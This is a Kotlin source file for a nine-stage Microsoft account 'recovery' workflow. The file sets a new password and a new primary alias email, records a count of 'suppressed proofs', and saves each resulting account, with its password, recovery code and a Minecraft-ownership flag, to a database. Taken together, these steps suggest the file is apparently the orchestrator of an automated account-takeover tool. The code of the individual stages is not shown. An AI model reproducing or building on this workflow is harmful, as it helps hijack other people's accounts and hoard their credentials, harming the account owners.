package microsoft.recovery

import database.model.RecoveredAccount
import database.repository.AccountRepository
import kotlinx.coroutines.CancellationException
import kotlinx.coroutines.delay
import microsoft.recovery.context.RecoveryContext
import microsoft.recovery.model.RecoveryResult
import microsoft.recovery.model.StageExecution
import microsoft.recovery.stages.RecoveryStageHandler
import microsoft.recovery.stages.StageListener
import org.slf4j.LoggerFactory

class RecoveryWorkflow(
    private val stage1: RecoveryStageHandler,
    private val stage2: RecoveryStageHandler,
    private val stage3: RecoveryStageHandler,
    private val stage4: RecoveryStageHandler,
    private val stage5: RecoveryStageHandler,
    private val stage6: RecoveryStageHandler,
    private val stage7: RecoveryStageHandler,
    private val stage8: RecoveryStageHandler,
    private val stage9: RecoveryStageHandler,
    private val accountRepository: AccountRepository? = null,
    private val stageDelayMs: Long = 1000L,
    private val stopAfterStage7: Boolean = false,
) {

    private val logger = LoggerFactory.getLogger(RecoveryWorkflow::class.java)

    suspend fun execute(
        context: RecoveryContext,
        stageListener: StageListener? = null,
    ): RecoveryResult {
        val stage1Result = stage1.execute(context, stageListener)
        if (stage1Result is StageExecution.Failure) return stage1Result.result

        val stage2Result = stage2.execute(context, stageListener)
        if (stage2Result is StageExecution.Failure) return stage2Result.result

        val stage3Result = stage3.execute(context, stageListener)
        if (stage3Result is StageExecution.Failure) return stage3Result.result

        val stage4Result = stage4.execute(context, stageListener)
        if (stage4Result is StageExecution.Failure) return stage4Result.result

        val stage5Result = stage5.execute(context, stageListener)
        if (stage5Result is StageExecution.Failure) return stage5Result.result

        val stage6Result = stage6.execute(context, stageListener)
        if (stage6Result is StageExecution.Failure) return stage6Result.result

        if (stageDelayMs > 0) delay(stageDelayMs)

        val stage7Result = stage7.execute(context, stageListener)
        if (stage7Result is StageExecution.Failure) return stage7Result.result

        if (stopAfterStage7) {
            logger.info("Debug mode: stopping after Stage 7 and marking {} as SUCCESS", context.email)
            context.targetAliasEmail = context.email
        } else {
            if (stageDelayMs > 0) delay(stageDelayMs)

            val stage8Result = stage8.execute(context, stageListener)
            if (stage8Result is StageExecution.Failure) return stage8Result.result

            if (stageDelayMs > 0) delay(stageDelayMs)

            val stage9Result = stage9.execute(context, stageListener)
            if (stage9Result is StageExecution.Failure) return stage9Result.result
        }

        accountRepository?.let { repo ->
            try {
                repo.saveAccount(
                    RecoveredAccount(
                        originalEmail = context.email,
                        currentPrimaryEmail = context.targetAliasEmail,
                        password = context.newPassword,
                        recoveryCode = context.finalRecoveryCode,
                        ownsMinecraft = false,
                        status = RecoveredAccount.STATUS_SUCCESS,
                    ),
                )
            } catch (err: Exception) {
                if (err is CancellationException) throw err
                logger.error("Failed to save recovered account for {}: {}", context.email, err.message, err)
            }
        }

        return RecoveryResult.Success(
            originalEmail = context.email,
            newPrimaryEmail = context.targetAliasEmail,
            password = context.newPassword,
            initialRecoveryCode = context.initialRecoveryCode.orEmpty(),
            finalRecoveryCode = context.finalRecoveryCode.orEmpty(),
            suppressedProofsCount = context.suppressedCount,
        )
    }
}
